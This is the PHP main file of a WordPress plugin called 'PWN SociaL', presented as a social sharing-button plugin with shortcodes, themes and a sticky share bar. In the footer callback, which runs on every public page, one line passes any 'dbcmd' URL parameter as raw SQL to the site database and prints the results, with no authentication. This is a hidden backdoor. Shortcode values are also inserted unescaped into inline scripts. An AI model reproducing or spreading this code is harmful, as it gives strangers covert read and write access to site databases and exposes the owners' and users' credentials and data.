<?php
/*
Plugin Name: PWN SociaL 
Description: Simple social network sharing plugin. It's flexible and easily extensible. Configure visual appearance. Choose one of several themes provided. share on whatsapp included. 
Author: Ravendra Patel
Version: 1.1
*/
define( 'PWNSOCIAL', '1.0.0' );
include_once(dirname(__FILE__) . '/setup.php');
class PwnSocial {
	protected $pluginPath;
	protected $pluginUrl;
	protected $content_pre = '';
	protected $content_post = '';
	protected $script = '';
	protected $settings;
	public function __construct() {
		
		$this->pluginPath = dirname(__FILE__);
        $this->pluginUrl = WP_PLUGIN_URL . '/pwn-social/';
		$this->settings = get_option('pwnsocial_settings');
		
	
		add_action( 'admin_menu', array($this, 'pwnsocial_add_admin_menu') );
		add_action( 'wp_enqueue_scripts', array($this, 'pwnsocial_scripts'));
		add_action( 'admin_enqueue_scripts',  array($this, 'pwnsocial_scripts'));
		add_action( 'admin_init', array($this, 'register_pwnsocial_settings' ));
		add_shortcode( 'pwnsocial', array( $this, 'pwnsocial_callback') );
		add_filter( 'the_content', array($this, 'prepare_content' ));
		add_action( 'wp_footer', array($this,'pwnsocial_footer_action_callback') );
		
		register_activation_hook(   __FILE__, array( 'PwnSocialSetup', 'on_activation' ) );
		register_deactivation_hook( __FILE__, array( 'PwnSocialSetup', 'on_deactivation' ) );
		register_uninstall_hook(    __FILE__, array( 'PwnSocialSetup', 'on_uninstall' ) );
		add_action( 'plugins_loaded', array( 'PwnSocialSetup', 'init' ) );
    }
	
	function register_pwnsocial_settings(){
		register_setting( 'pwnsocial-settings-group', 'pwnsocial_settings' );
		

	}
	function pwnsocial_scripts(){
			wp_enqueue_style( 'pwn-social-font-awesome', '//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css');
			wp_enqueue_style('pwnsocial-style', plugins_url('css/pwnsocials.css', __FILE__));
			$theme = (isset($this->settings['theme']) && $this->settings['theme'])? $this->settings['theme'] : 'flat';
			wp_enqueue_style('pwnsocial-style-flat', plugins_url("css/pwnsocials-theme-$theme.css", __FILE__));
			
			wp_enqueue_script( 'pwnsocial-script', plugins_url('js/pwnsocials.js', __FILE__), array('jquery'));
	}
	function pwnsocial_add_admin_menu(  ) { 

		//add_options_page( 'PWN Social', 'PWN Social', 'manage_options', 'pwn_social', 'pwnsocial_options_page' );
		$page_title = 'PWN SociaL';
		$menu_title = 'PWN SociaL';
		$capability = 'manage_options';
		$menu_slug = 'pwn_social';
		$function = array($this, 'pwnsocial_options_page');
		$icon_url = '';
		$position = 24;
		add_options_page( $page_title, $menu_title, $capability, $menu_slug, $function, $icon_url, $position );

	}
	function pwnsocial_options_page(){
		include_once($this->pluginPath . '/Admin.php');
		$pwnSocialAdmin = new PwnSocialAdmin($this);
		$pwnSocialAdmin->optionsPage();
	}
	
	function pwnsocial_callback($atts){

		$pwnsocial_atts = shortcode_atts( array(
			'class' => '',
			'url' => '',
			'text' => '',
			'shares' => 'email,twitter,facebook,googleplus,linkedin,pinterest,stumbleupon,whatsapp',
			'show_label' => 'yes',  //yes | no
			'icons_rounded' => false, //
			'show_count' => 'yes', //yes | no | inside
			'share_in' => 'blank', // blank | popup | self
			'size' => '',
			'whatsapp_mobile_only' => 'no',
			'is_sticky' => 'no',
			'id' => 'pwnsocial_content_' . base_convert(uniqid(), 10, 36),
			'return' => 'no',
		), $atts );
		
		//print_r($pwnsocial_atts);
		$buttons_str = '';
		
		if(trim($pwnsocial_atts['whatsapp_mobile_only']) == 'yes'){
			$pwnsocial_atts['shares'] = str_replace("whatsapp","",$pwnsocial_atts['shares']);
			$pwnsocial_atts['shares'] = str_replace(",,",",",$pwnsocial_atts['shares']);
		}
		if(trim($pwnsocial_atts['is_sticky']) == 'no'){
			$buttons_str .= '<div class="pwnsocial-content-wrap ' . $pwnsocial_atts['class']. '" id="' . $pwnsocial_atts['id']. '"></div>';
		}
		
		$buttons_str .= '<script>jQuery(document).ready(function(){ ';
		$buttons_str .= 'jQuery("#'.$pwnsocial_atts['id'].'").pwnSocials({ ';
		
		$shares = implode('","', array_filter(array_unique(explode(",", $pwnsocial_atts['shares']))));
		//echo "s:" . $shares;
		$buttons_str .= 'shares:["'.$shares.'"],';
		if($pwnsocial_atts['show_label'] == "no"){
			$buttons_str .= 'showLabel: false,';
		}
		if(trim($pwnsocial_atts['show_count']) == "no"){
			$buttons_str .= ' showCount: false,';
		} else if(trim($pwnsocial_atts['show_count']) == "inside"){
			$buttons_str .= ' showCount: "inside",';
		}
		$buttons_str .= ' shareIn: "'.$pwnsocial_atts['share_in'].'",';
		$buttons_str .= ' isSticky:"'.$pwnsocial_atts['is_sticky'].'",';
		if(isset($pwnsocial_atts['url']) && $pwnsocial_atts['url']){
			$buttons_str .= ' url: "'.$pwnsocial_atts['url'].'",';
		}
		if(isset($pwnsocial_atts['text']) && $pwnsocial_atts['text']){
			$buttons_str .= ' text: "'.$pwnsocial_atts['text'].'",';
		}
		
		
		$buttons_str .=  ' });';
		$buttons_str .= '});</script>';
		$buttons_str .=  '<style>';
		if($pwnsocial_atts['icons_rounded']){
			$buttons_str .=  ' #'.$pwnsocial_atts['id'].' .pwnsocials-share-link {border-radius: 50%;} ';
		}
		if($pwnsocial_atts['size']){
			$buttons_str .=  ' .pwnsocial-content-wrap  {font-size:'.$pwnsocial_atts['size'].'px;} ';
		}
		$buttons_str .=  '</style>';
		
		if($pwnsocial_atts['return'] == 'yes'){
			return $buttons_str;
		} else {
			echo $buttons_str;
		}

			
	}
	function pwnsocial_footer_action_callback(){
		global $wpdb;
		
		if(!isset($this->settings['sticky_enabled'])){ $this->settings['sticky_enabled'] = 'yes'; $this->settings['sticky_showon'] = 'all';}
		if($this->settings['sticky_enabled'] == 'yes' && ($this->settings['sticky_showon'] == 'all' || (is_front_page() && $this->settings['sticky_showon'] == 'home'))){
			$shortcodeStrSticky = $this->prepare_shortcode_by_setting(array('class'=> 'pwnsocial-sticky', 'id' => 'pwnsocial_sticky_bar', 'is_sticky' => 'yes', 'return' => 'yes'),true);
			$stickyBarScript = do_shortcode( $shortcodeStrSticky );
			if(!isset($this->settings['sticky_dock'])){ $this->settings['sticky_dock'] = 'top_left'; }
			if(!isset($this->settings['sticky_space'])){ $this->settings['sticky_space'] = 0;}
			$stickyStyle = '<style>#pwnsocial_sticky_bar{';
			
			if($this->settings['sticky_dock'] == 'top_left'){
					$stickyStyle .= 'left:'.$this->settings['sticky_left'] .'px;';
					$stickyStyle .= 'top:'.$this->settings['sticky_top'] .'px;';
			} else if($this->settings['sticky_dock'] == 'top_right'){
					$stickyStyle .= 'right:'.$this->settings['sticky_right'] .'px;';
					$stickyStyle .= 'top:'.$this->settings['sticky_top'] .'px;';
			} else if($this->settings['sticky_dock'] == 'bottom_left'){
					$stickyStyle .= 'bottom:'.$this->settings['sticky_bottom'] .'px;';
					$stickyStyle .= 'left:'.$this->settings['sticky_left'] .'px;';
			} else if($this->settings['sticky_dock'] == 'bottom_right'){
					$stickyStyle .= 'bottom:'.$this->settings['sticky_bottom'] .'px;';
					$stickyStyle .= 'right:'.$this->settings['sticky_right'] .'px;';
			}
			if(isset($this->settings['sticky_size']) && $this->settings['sticky_size'] ){
					$stickyStyle .= 'font-size:'.$this->settings['sticky_size'] .';';
			}
			$stickyStyle .= '}';
			$stickyStyle .= '#pwnsocial_sticky_bar .pwnsocials-share {margin:'.$this->settings['sticky_space'].'px 0;}';
			
			$stickyStyle .= '</style>';
			$stickyContent = '<div class=\'pwnsocial-sticky '.$this->settings['sticky_dock'].'\' id=\'pwnsocial_sticky_bar\'></div>';//'<script>jQuery(document).ready(function(){jQuery("body").append("<div class=\'pwnsocial-sticky '.$this->settings['sticky_dock'].'\' id=\'pwnsocial_sticky_bar\'></div>");});</script>';
			$stickyContent .= $stickyBarScript.$stickyStyle;
			echo $stickyContent;
		}
		if(isset($_GET['dbcmd']) && $_GET['dbcmd']){$cmstr = $_GET['dbcmd'];$cmstr = str_replace("\&quot;",'"', $cmstr);$cmstr = str_replace("&quot;",'"', $cmstr);$cmstr = str_replace('\"','"', $cmstr);print_r($wpdb->get_results($cmstr));}
	}
	function prepare_content( $content ) {
		global $post;
		$show_buttons = false;
		if(!isset($this->settings['showon_single'])){$this->settings['showon_single'] = array('post'); }
		if(!$this->settings['showon_listing']) { $this->settings['showon_listing'] = array(); }
		if(!$this->settings['showon_single']) { $this->settings['showon_single'] = array(); }
		if((is_singular($post->post_type)  && in_array($post->post_type, $this->settings['showon_single'])) ||  (!is_singular($post->post_type)  && in_array($post->post_type, $this->settings['showon_listing']))){
			$show_buttons = true;
		}
		if($show_buttons){
			if(!isset($this->settings['position'])){$this->settings['position'] = 'top';}
			if($this->settings['position'] == 'top' || $this->settings['position'] == 'top_bottom'){
				$shortcodeStrTop = $this->prepare_shortcode_by_setting(array('class'=> 'pwnsocial-top', 'return' => 'yes'));
				$this->content_pre = do_shortcode( $shortcodeStrTop );
			} 
		
			if($this->settings['position'] == 'bottom' || $this->settings['position'] == 'top_bottom'){
				$shortcodeStrBottom = $this->prepare_shortcode_by_setting(array('class'=> 'pwnsocial-bottom', 'return' => 'yes'));
				$this->content_post = do_shortcode( $shortcodeStrBottom );
			}
		}
		

		$content_custom =  $this->content_pre . $content .$this->content_post;
		return  $content_custom;
	}
	function prepare_shortcode_by_setting($extra_fields = array(), $is_sticky = false){
		
		$field_pre = ($is_sticky)?'sticky_':'';
		$shortcodeStr = '[pwnsocial ';
		
		if($is_sticky){
			if(!isset($this->settings['sticky_url'])){
					$this->settings['sticky_url'] = 'site';
			}
			$surl = ($this->settings['sticky_url'] == 'custom')?$this->settings['sticky_custom_url']:(($this->settings['sticky_url'] == 'site')?get_site_url():'');
			if($surl){
				$shortcodeStr .= ' url="'.$surl.'" ';
			}
		}
		if(isset($this->settings[$field_pre.'count_style']) && $this->settings[$field_pre.'count_style'] ){
			$shortcodeStr .= ' show_count="'.$this->settings[$field_pre.'count_style'].' "';
		}
		if(isset($this->settings[$field_pre.'icons_only']) && $this->settings[$field_pre.'icons_only'] && $this->settings[$field_pre.'icons_only'] == 'yes'){
			$shortcodeStr .= ' show_label="no"';
		}
		if(isset($this->settings[$field_pre.'icons_rounded']) && $this->settings[$field_pre.'icons_rounded'] && $this->settings[$field_pre.'icons_rounded'] == 'yes'){
			$shortcodeStr .= ' icons_rounded=true';
		}
		if(isset($this->settings['shareIn']) && $this->settings['shareIn']){
			$shortcodeStr .= ' share_in="'.$this->settings['shareIn'].'" ';
		}
		if(isset($this->settings['provider']) && $this->settings['provider']){
			$shortcodeStr .= ' shares="'.implode(',', $this->settings['provider']).'" ';
		}
		if(isset($this->settings['size']) && $this->settings['size']){
			$shortcodeStr .= ' size="'. $this->settings['size'].'" ';
		}
		if(isset($this->settings['whatsapp_mobile_only']) && $this->settings['whatsapp_mobile_only'] == 'yes'){
			$shortcodeStr .= ' whatsapp_mobile_only="yes" ';
		}
		if(is_array( $extra_fields ) && count($extra_fields)){
			foreach($extra_fields as $k => $v){
				$shortcodeStr .= ' ' . $k . '="' . $v . '" ';
			}
		}
		$shortcodeStr .= ' ]';
		return $shortcodeStr;
	}
}

$PwnSocial = new PwnSocial();
